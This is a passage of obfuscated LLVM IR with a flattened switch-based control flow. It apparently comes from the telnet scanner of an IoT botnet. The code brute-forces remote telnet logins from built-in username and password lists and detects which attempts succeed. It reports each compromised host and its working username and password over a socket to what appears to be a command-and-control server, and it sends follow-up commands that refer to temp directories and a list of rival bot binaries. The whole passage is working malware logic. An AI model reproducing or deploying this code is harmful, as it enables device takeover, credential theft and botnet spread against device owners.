  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %381, i32 0, i32 7
  store i32 %378, i32* %382, align 16
  %383 = load i32, i32* %6, align 4
  %384 = sext i32 %383 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %384
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %385, i32 0, i32 9
  %387 = load i8*, i8** %386, align 8
  %388 = call i32 @contains_fail(i8* %387)
  %389 = icmp ne i32 %388, 0
  %390 = select i1 %389, i32 139742893, i32 1783758383
  store i32 %390, i32* %switchVar
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  %392 = load i32, i32* %6, align 4
  %393 = sext i32 %392 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %393
  call void @advance_telstate(%struct.telstate_t* %394, i32 0)
  store i32 1443358615, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  %396 = load i32, i32* %6, align 4
  %397 = sext i32 %396 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %397
  call void @advance_telstate(%struct.telstate_t* %398, i32 3)
  store i32 1443358615, i32* %switchVar
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:400:                                    ; preds = %loopEntry
  %401 = load i32, i32* %6, align 4
  %402 = sext i32 %401 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 7
  %405 = load i32, i32* %404, align 16
  %406 = add i32 %405, 7
  %407 = zext i32 %406 to i64
  %408 = call i64 @time(i64* null) #5
  %409 = icmp slt i64 %407, %408
  %410 = select i1 %409, i32 -745162783, i32 704648681
  store i32 %410, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  %412 = load i32, i32* %6, align 4
  %413 = sext i32 %412 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %413
  call void @reset_telstate(%struct.telstate_t* %414)
  store i32 704648681, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  store i32 1015336728, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load i32, i32* %6, align 4
  %418 = sext i32 %417 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 0
  %421 = load i32, i32* %420, align 16
  %422 = load i32, i32* %6, align 4
  %423 = sext i32 %422 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 4
  %426 = load i8, i8* %425, align 2
  %427 = zext i8 %426 to i64
  %428 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %427
  %429 = load i8*, i8** %428, align 8
  %430 = load i32, i32* %6, align 4
  %431 = sext i32 %430 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 4
  %434 = load i8, i8* %433, align 2
  %435 = zext i8 %434 to i64
  %436 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %435
  %437 = load i8*, i8** %436, align 8
  %438 = call i64 @strlen(i8* %437) #9
  %439 = call i64 @send(i32 %421, i8* %429, i64 %438, i32 16384)
  %440 = icmp slt i64 %439, 0
  %441 = select i1 %440, i32 -1871009794, i32 -1694285390
  store i32 %441, i32* %switchVar
  br label %loopEnd

; <label>:442:                                    ; preds = %loopEntry
  %443 = load i32, i32* %6, align 4
  %444 = sext i32 %443 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %444
  call void @reset_telstate(%struct.telstate_t* %445)
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %6, align 4
  %448 = sext i32 %447 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %448
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %449, i32 0, i32 0
  %451 = load i32, i32* %450, align 16
  %452 = call i64 @send(i32 %451, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %453 = icmp slt i64 %452, 0
  %454 = select i1 %453, i32 -368570665, i32 422501581
  store i32 %454, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = load i32, i32* %6, align 4
  %457 = sext i32 %456 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %457
  call void @reset_telstate(%struct.telstate_t* %458)
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:459:                                    ; preds = %loopEntry
  %460 = load i32, i32* %6, align 4
  %461 = sext i32 %460 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %461
  call void @advance_telstate(%struct.telstate_t* %462, i32 4)
  store i32 1015336728, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  %464 = load i32, i32* %6, align 4
  %465 = sext i32 %464 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 0
  %468 = load i32, i32* %467, align 16
  %469 = load i32, i32* %3, align 4
  %470 = load i32, i32* %6, align 4
  %471 = sext i32 %470 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %471
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %472, i32 0, i32 9
  %474 = load i8*, i8** %473, align 8
  %475 = call i32 @read_until_response(i32 %468, i32 %469, i8* %474, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %476 = icmp ne i32 %475, 0
  %477 = select i1 %476, i32 -395404207, i32 886563210
  store i32 %477, i32* %switchVar
  br label %loopEnd

; <label>:478:                                    ; preds = %loopEntry
  %479 = call i64 @time(i64* null) #5
  %480 = trunc i64 %479 to i32
  %481 = load i32, i32* %6, align 4
  %482 = sext i32 %481 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %482
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %483, i32 0, i32 7
  store i32 %480, i32* %484, align 16
  %485 = load i32, i32* %6, align 4
  %486 = sext i32 %485 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %486
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %487, i32 0, i32 9
  %489 = load i8*, i8** %488, align 8
  %490 = call i32 @contains_fail(i8* %489)
  %491 = icmp ne i32 %490, 0
  %492 = select i1 %491, i32 1957289215, i32 -945299864
  store i32 %492, i32* %switchVar
  br label %loopEnd

; <label>:493:                                    ; preds = %loopEntry
  %494 = load i32, i32* %6, align 4
  %495 = sext i32 %494 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %495
  call void @advance_telstate(%struct.telstate_t* %496, i32 0)
  store i32 -2042002933, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = load i32, i32* %6, align 4
  %499 = sext i32 %498 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %499
  call void @advance_telstate(%struct.telstate_t* %500, i32 5)
  store i32 -2042002933, i32* %switchVar
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  %503 = load i32, i32* %6, align 4
  %504 = sext i32 %503 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 7
  %507 = load i32, i32* %506, align 16
  %508 = add i32 %507, 7
  %509 = zext i32 %508 to i64
  %510 = call i64 @time(i64* null) #5
  %511 = icmp slt i64 %509, %510
  %512 = select i1 %511, i32 1909638705, i32 -687647990
  store i32 %512, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i32, i32* %6, align 4
  %515 = sext i32 %514 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %515
  call void @reset_telstate(%struct.telstate_t* %516)
  store i32 -687647990, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  store i32 1015336728, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  %519 = load i32, i32* %6, align 4
  %520 = sext i32 %519 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %520
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %521, i32 0, i32 0
  %523 = load i32, i32* %522, align 16
  %524 = load i32, i32* %6, align 4
  %525 = sext i32 %524 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %525
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %526, i32 0, i32 5
  %528 = load i8, i8* %527, align 1
  %529 = zext i8 %528 to i64
  %530 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %529
  %531 = load i8*, i8** %530, align 8
  %532 = load i32, i32* %6, align 4
  %533 = sext i32 %532 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 5
  %536 = load i8, i8* %535, align 1
  %537 = zext i8 %536 to i64
  %538 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %537
  %539 = load i8*, i8** %538, align 8
  %540 = call i64 @strlen(i8* %539) #9
  %541 = call i64 @send(i32 %523, i8* %531, i64 %540, i32 16384)
  %542 = icmp slt i64 %541, 0
  %543 = select i1 %542, i32 -1141881978, i32 -435148952
  store i32 %543, i32* %switchVar
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  %545 = load i32, i32* %6, align 4
  %546 = sext i32 %545 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %546
  call void @reset_telstate(%struct.telstate_t* %547)
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:548:                                    ; preds = %loopEntry
  %549 = load i32, i32* %6, align 4
  %550 = sext i32 %549 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %550
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %551, i32 0, i32 0
  %553 = load i32, i32* %552, align 16
  %554 = call i64 @send(i32 %553, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %555 = icmp slt i64 %554, 0
  %556 = select i1 %555, i32 -58018858, i32 1442086622
  store i32 %556, i32* %switchVar
  br label %loopEnd

; <label>:557:                                    ; preds = %loopEntry
  %558 = load i32, i32* %6, align 4
  %559 = sext i32 %558 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %559
  call void @reset_telstate(%struct.telstate_t* %560)
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:561:                                    ; preds = %loopEntry
  %562 = load i32, i32* %6, align 4
  %563 = sext i32 %562 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %563
  call void @advance_telstate(%struct.telstate_t* %564, i32 6)
  store i32 1015336728, i32* %switchVar
  br label %loopEnd

; <label>:565:                                    ; preds = %loopEntry
  %566 = load i32, i32* %6, align 4
  %567 = sext i32 %566 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 0
  %570 = load i32, i32* %569, align 16
  %571 = load i32, i32* %3, align 4
  %572 = load i32, i32* %6, align 4
  %573 = sext i32 %572 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 9
  %576 = load i8*, i8** %575, align 8
  %577 = call i32 @read_until_response(i32 %570, i32 %571, i8* %576, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %578 = icmp ne i32 %577, 0
  %579 = select i1 %578, i32 -1955352274, i32 -648443220
  store i32 %579, i32* %switchVar
  br label %loopEnd

; <label>:580:                                    ; preds = %loopEntry
  %581 = call i64 @time(i64* null) #5
  %582 = trunc i64 %581 to i32
  %583 = load i32, i32* %6, align 4
  %584 = sext i32 %583 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %584
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %585, i32 0, i32 7
  store i32 %582, i32* %586, align 16
  %587 = load i32, i32* %6, align 4
  %588 = sext i32 %587 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 9
  %591 = load i8*, i8** %590, align 8
  %592 = call i32 @contains_fail(i8* %591)
  %593 = icmp ne i32 %592, 0
  %594 = select i1 %593, i32 -713636450, i32 -1390149147
  store i32 %594, i32* %switchVar
  br label %loopEnd

; <label>:595:                                    ; preds = %loopEntry
  %596 = load i32, i32* %6, align 4
  %597 = sext i32 %596 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %597
  call void @advance_telstate(%struct.telstate_t* %598, i32 0)
  store i32 817357565, i32* %switchVar
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  %600 = load i32, i32* %6, align 4
  %601 = sext i32 %600 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 9
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @contains_success(i8* %604)
  %606 = icmp ne i32 %605, 0
  %607 = select i1 %606, i32 -2103343836, i32 465081992
  store i32 %607, i32* %switchVar
  br label %loopEnd

; <label>:608:                                    ; preds = %loopEntry
  %609 = load i32, i32* %6, align 4
  %610 = sext i32 %609 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 3
  %613 = load i8, i8* %612, align 1
  %614 = zext i8 %613 to i32
  %615 = icmp eq i32 %614, 2
  %616 = select i1 %615, i32 204049139, i32 -1041077727
  store i32 %616, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  %618 = load i32, i32* %6, align 4
  %619 = sext i32 %618 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %619
  call void @advance_telstate(%struct.telstate_t* %620, i32 7)
  store i32 -1940903272, i32* %switchVar
  br label %loopEnd

; <label>:621:                                    ; preds = %loopEntry
  %622 = load i32, i32* @mainCommSock, align 4
  %623 = load i32, i32* %6, align 4
  %624 = sext i32 %623 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %624
  %626 = call i8* @get_telstate_host(%struct.telstate_t* %625)
  %627 = load i32, i32* %6, align 4
  %628 = sext i32 %627 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %628
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %629, i32 0, i32 4
  %631 = load i8, i8* %630, align 2
  %632 = zext i8 %631 to i64
  %633 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %632
  %634 = load i8*, i8** %633, align 8
  %635 = load i32, i32* %6, align 4
  %636 = sext i32 %635 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %636
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %637, i32 0, i32 5
  %639 = load i8, i8* %638, align 1
  %640 = zext i8 %639 to i64
  %641 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %640
  %642 = load i8*, i8** %641, align 8
  %643 = call i32 (i32, i8*, ...) @sockprintf(i32 %622, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.488, i32 0, i32 0), i8* %626, i8* %634, i8* %642)
  %644 = load i32, i32* %6, align 4
  %645 = sext i32 %644 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %645
  call void @advance_telstate(%struct.telstate_t* %646, i32 7)
  store i32 -1940903272, i32* %switchVar
  br label %loopEnd

; <label>:647:                                    ; preds = %loopEntry
  store i32 -700124276, i32* %switchVar
  br label %loopEnd

; <label>:648:                                    ; preds = %loopEntry
  %649 = load i32, i32* %6, align 4
  %650 = sext i32 %649 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %650
  call void @reset_telstate(%struct.telstate_t* %651)
  store i32 -700124276, i32* %switchVar
  br label %loopEnd

; <label>:652:                                    ; preds = %loopEntry
  store i32 817357565, i32* %switchVar
  br label %loopEnd

; <label>:653:                                    ; preds = %loopEntry
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  %655 = load i32, i32* %6, align 4
  %656 = sext i32 %655 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 7
  %659 = load i32, i32* %658, align 16
  %660 = add i32 %659, 7
  %661 = zext i32 %660 to i64
  %662 = call i64 @time(i64* null) #5
  %663 = icmp slt i64 %661, %662
  %664 = select i1 %663, i32 -101774770, i32 2145671028
  store i32 %664, i32* %switchVar
  br label %loopEnd

; <label>:665:                                    ; preds = %loopEntry
  %666 = load i32, i32* %6, align 4
  %667 = sext i32 %666 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %667
  call void @reset_telstate(%struct.telstate_t* %668)
  store i32 2145671028, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  store i32 1015336728, i32* %switchVar
  br label %loopEnd

; <label>:670:                                    ; preds = %loopEntry
  %671 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %672 = call i32 (i8*, i8*, ...) @sprintf(i8* %671, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.489, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %673 = load i32, i32* %6, align 4
  %674 = sext i32 %673 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 0
  %677 = load i32, i32* %676, align 16
  %678 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %679 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %680 = call i64 @strlen(i8* %679) #9
  %681 = call i64 @send(i32 %677, i8* %678, i64 %680, i32 16384)
  %682 = icmp slt i64 %681, 0
  %683 = select i1 %682, i32 674379239, i32 -273406477
  store i32 %683, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  %685 = load i32, i32* %6, align 4
  %686 = sext i32 %685 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %686
  call void @reset_telstate(%struct.telstate_t* %687)
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:688:                                    ; preds = %loopEntry
  call void @RemoveTempDirs()
  %689 = load i32, i32* @mainCommSock, align 4
  %690 = load i32, i32* %6, align 4
  %691 = sext i32 %690 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %691
  %693 = call i8* @get_telstate_host(%struct.telstate_t* %692)
  %694 = load i32, i32* %6, align 4
  %695 = sext i32 %694 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 4
  %698 = load i8, i8* %697, align 2
  %699 = zext i8 %698 to i64
  %700 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %699
  %701 = load i8*, i8** %700, align 8
  %702 = load i32, i32* %6, align 4
  %703 = sext i32 %702 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 5
  %706 = load i8, i8* %705, align 1
  %707 = zext i8 %706 to i64
  %708 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %707
  %709 = load i8*, i8** %708, align 8
  %710 = call i32 (i32, i8*, ...) @sockprintf(i32 %689, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.490, i32 0, i32 0), i8* %693, i8* %701, i8* %709)
  %711 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %712 = call i32 (i8*, i8*, ...) @sprintf(i8* %711, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.491, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %713 = load i32, i32* %6, align 4
  %714 = sext i32 %713 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %714
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %715, i32 0, i32 0
  %717 = load i32, i32* %716, align 16
  %718 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %719 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %720 = call i64 @strlen(i8* %719) #9
  %721 = call i64 @send(i32 %717, i8* %718, i64 %720, i32 16384)
  %722 = icmp slt i64 %721, 0
  %723 = select i1 %722, i32 -836553590, i32 1810600987
  store i32 %723, i32* %switchVar
  br label %loopEnd

; <label>:724:                                    ; preds = %loopEntry
  %725 = load i32, i32* %6, align 4
  %726 = sext i32 %725 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %726
  call void @reset_telstate(%struct.telstate_t* %727)
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:728:                                    ; preds = %loopEntry
  %729 = load i32, i32* @mainCommSock, align 4
  %730 = load i32, i32* %6, align 4
  %731 = sext i32 %730 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %731
  %733 = call i8* @get_telstate_host(%struct.telstate_t* %732)
  %734 = load i32, i32* %6, align 4
  %735 = sext i32 %734 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %735
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %736, i32 0, i32 4
  %738 = load i8, i8* %737, align 2
  %739 = zext i8 %738 to i64
  %740 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %739
  %741 = load i8*, i8** %740, align 8
  %742 = load i32, i32* %6, align 4
  %743 = sext i32 %742 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %743
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %744, i32 0, i32 5
  %746 = load i8, i8* %745, align 1
  %747 = zext i8 %746 to i64
  %748 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %747
  %749 = load i8*, i8** %748, align 8
  %750 = call i32 (i32, i8*, ...) @sockprintf(i32 %729, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.492, i32 0, i32 0), i8* %733, i8* %741, i8* %749)
  %751 = load i32, i32* %6, align 4
  %752 = sext i32 %751 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %752
  call void @advance_telstate(%struct.telstate_t* %753, i32 8)
  store i32 1015336728, i32* %switchVar
  br label %loopEnd

